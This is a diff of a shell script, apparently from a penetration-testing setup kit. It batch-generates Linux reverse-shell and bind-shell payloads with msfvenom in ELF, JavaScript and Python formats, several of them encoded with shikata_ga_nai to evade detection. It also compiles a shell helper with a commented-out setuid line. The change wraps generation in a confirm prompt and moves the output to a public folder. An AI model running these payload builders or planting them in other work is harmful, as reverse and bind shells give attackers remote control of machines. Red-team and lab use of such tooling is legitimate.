@@ -1,31 +1,32 @@
-mkdir payloads_linux
-cd payloads_linux
+mkdir public/payloads_linux
+cd public/payloads_linux
 
-  # Reverse shells
-  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -o shell_reverse_tcp_x86.elf
-  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -o shell_reverse_tcp_x64.elf
+  if confirm "Regenerate payloads_linux [y/n]? "; then
+    # Reverse shells
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -o shell_reverse_tcp_x86.elf
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -o shell_reverse_tcp_x64.elf
 
-  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.elf
-  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.elf
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.elf
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.elf
 
-  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.js_le
-  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.js_le
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.js_le
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.js_le
 
-  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.python
-  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.python
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.python
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.python
 
-  # Bind shells
-  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -o shell_bind_tcp_x86.elf
-  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -o shell_bind_tcp_x64.elf
+    # Bind shells
+    msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -o shell_bind_tcp_x86.elf
+    msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -o shell_bind_tcp_x64.elf
 
-  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.elf
-  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.elf
+    msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.elf
+    msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.elf
 
-  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.js_le
-  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.js_le
+    msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.js_le
+    msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.js_le
 
-  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.python
-  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.python
+    msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.python
+    msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.python
 
 cat <<\EOT >shell.c
 #include<stdlib.h>
@@ -38,6 +39,9 @@ EOT
 gcc shell.c -o shell
 #chmod 4755 shell
 
-  # Create all common shells in payloads_linux folder
-  bash ../_setup/setup_payloads.sh
+    # Create all common shells in payloads_linux folder
+    bash ../_setup/setup_payloads.sh
+
+  fi
+
 cd -
